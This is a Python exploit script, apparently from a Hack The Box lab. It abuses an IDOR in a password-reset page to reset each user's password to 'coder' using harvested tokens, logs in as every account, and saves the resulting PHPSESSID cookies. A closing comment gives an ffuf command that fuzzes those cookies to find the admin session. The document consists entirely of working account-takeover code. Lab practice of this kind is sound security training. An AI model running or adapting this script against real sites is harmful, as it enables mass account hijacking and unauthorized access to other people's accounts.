# this exploit assumes that we can not know which account is the admin account usign the IDOR.
# change the ips
import os # so we can execute bash scripts
import json
import requests
import urllib3

os.system("bash tokens.sh")
os.system("bash users.sh")

with open("/home/htb-ac-1587372/exploit/tokens.txt", "r") as tokensFile: # change this
    jtokens = tokensFile.readlines()

headers = {
    "User-Agent": "Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1",
    "Cookie": "PHPSESSID=19v9677ckrju18hish3hocgog5"
}
url = "http://94.237.50.242:55866/reset.php"
parms = dict()

j = 1
for tokenj in jtokens:
    json_obj = json.loads(tokenj.strip())
    token = json_obj.get("token")

    parms["uid"] = j
    parms["token"] = token
    parms["password"] = "coder"
    req = requests.get(url, params=parms, allow_redirects=True, verify=False, headers=headers)

    if j == 2:
        print(req.text)

    j += 1

# Suppress SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

with open("/home/htb-ac-1587372/exploit/users.txt", "r") as user:
    users = user.readlines()
logmein = dict()

for user in users:
    session = requests.Session() # important to be inside the loop
    userobj = json.loads(user.strip())

    username = userobj.get("username")
    logmein["username"] = username
    
    logmein["password"] = "coder"    
    login = session.post(
            "http://94.237.50.242:55866/index.php",
            data=logmein,
            allow_redirects=True,
            verify=False
        )

    with open("/home/htb-ac-1587372/exploit/phpssids.txt", "a") as phpssids_file: # change this
        # Get cookies after redirects
        cookies = session.cookies
        phpssid = cookies.get('PHPSESSID')

        #close and save
        session.close()
        phpssids_file.write(f"{phpssid}\n")

  # after executing the script, execute the following command to know who is the admin
  #  ffuf -u http://94.237.50.242:55866/event.php -H "Cookie: PHPSESSID=FUZZ;" -w phpssids.txt -fs 0
